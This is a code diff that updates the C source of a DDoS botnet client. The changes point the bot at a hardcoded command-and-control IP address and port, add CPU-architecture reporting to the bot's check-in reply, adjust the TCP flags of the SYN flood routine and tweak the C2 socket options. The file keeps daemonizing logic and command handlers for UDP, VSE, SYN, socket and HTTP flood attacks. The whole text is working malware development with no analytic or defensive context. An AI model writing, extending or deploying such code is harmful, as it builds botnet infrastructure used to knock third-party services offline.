@@ -10,9 +10,9 @@
 #include <sys/stat.h>
 #include <time.h>
 
-#define CNC_IP "1.1.1.1"
-#define BOT_PORT 1024
-#define MAX_THREADS 4
+#define CNC_IP "157.173.202.137"
+#define BOT_PORT 1338
+#define MAX_THREADS 1
 
 typedef struct {
     struct sockaddr_in target_addr;
@@ -20,6 +20,33 @@ typedef struct {
     int active;
     int attack_type;
 } attack_params;
+
+const char* get_arch() {
+    #if defined(__aarch64__)
+    return "aarch64";
+    #elif defined(__arm__)
+    return "arm";
+    #elif defined(__m68k__)
+    return "m68k";
+    #elif defined(__mips__)
+    return "mips";
+    #elif defined(__mipsel__)
+    return "mipsel";
+    #elif defined(__powerpc64__)
+    return "powerpc64";
+    #elif defined(__sh__)
+    return "sh4";
+    #elif defined(__sparc__)
+    return "sparc";
+    #elif defined(__x86_64__)
+    return "x86_64";
+    #elif defined(__i386__)
+    return "i686";
+    #else
+    return "unknown";
+    #endif
+}
+
 
 void daemonize() {
     pid_t pid = fork();
@@ -116,7 +143,7 @@ void* syn_attack(void* arg) {
         tcph->syn = 1;
         tcph->rst = 0;
         tcph->psh = 1;
-        tcph->ack = 0;
+        tcph->ack = 1;
         tcph->urg = 0;
         tcph->window = htons(5840);
         tcph->check = 0;
@@ -179,8 +206,11 @@ void* http_attack(void* arg) {
 void handle_command(const char *command, int sock) {
     static attack_params* params = NULL;
     static pthread_t threads[MAX_THREADS];
+    const char* arch = get_arch();
     if (strcmp(command, "ping") == 0) {
-        send(sock, "pong", strlen("pong"), 0);
+        char buffer[256];
+        snprintf(buffer, sizeof(buffer), "pong %s", arch);
+        send(sock, buffer, strlen(buffer), 0);
     } else if (strncmp(command, "!udp", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0) {
         char ip[20];
         int port, time;
@@ -245,7 +275,6 @@ void handle_command(const char *command, int sock) {
     }
 }
 
-
 int main() {
     daemonize();
 
@@ -264,6 +293,11 @@ int main() {
 
         int optval = 1;
         if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
+            close(sock);
+            return 1;
+        }
+
+        if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
             close(sock);
             return 1;
         }
@@ -292,4 +326,5 @@ int main() {
     close(sock);
     return 0;
 }
+
 
